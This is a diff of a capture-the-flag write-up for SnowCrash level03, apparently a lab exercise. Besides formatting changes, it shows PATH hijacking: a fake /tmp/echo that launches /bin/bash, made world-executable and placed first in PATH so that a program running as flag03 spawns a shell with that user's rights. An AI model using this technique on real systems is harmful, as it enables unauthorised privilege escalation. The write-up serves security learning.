@@ -1,6 +1,7 @@
 # Level03
 
-### Research
+## Research
+------------
 
 ```bash
 level03@SnowCrash:~$ ls -l
@@ -36,21 +37,25 @@ https://stackoverflow.com/questions/43793040/how-does-usr-bin-env-work-in-a-linu
 
 `The PATH environment variable is a colon-delimited list of directories that your shell searches through when you enter a command.`
 
-### Solution
+## Solution
+-----------
 
 If we make a fake echo function, then change the path so that it finds our echo first instead of the real one, tt will run it as flag03.
 
 - Steps:
-  1. Make a fake echo function
+
+  - Make a fake echo function
       ```bash
       echo "/bin/bash" > /tmp/echo
       ```
       This will create a fake echo that will execute /bin/bash, that is a new connection to our shell with the current user's permission.
-  2. Make this script executabled by flag03
+      
+  - Make this script executabled by flag03
       ``` bash
       chmod 777 /tmp/echo
       ```
-  3. Change path
+      
+  - Change path
       ``` bash
       export PATH=/tmp:$PATH
       ```
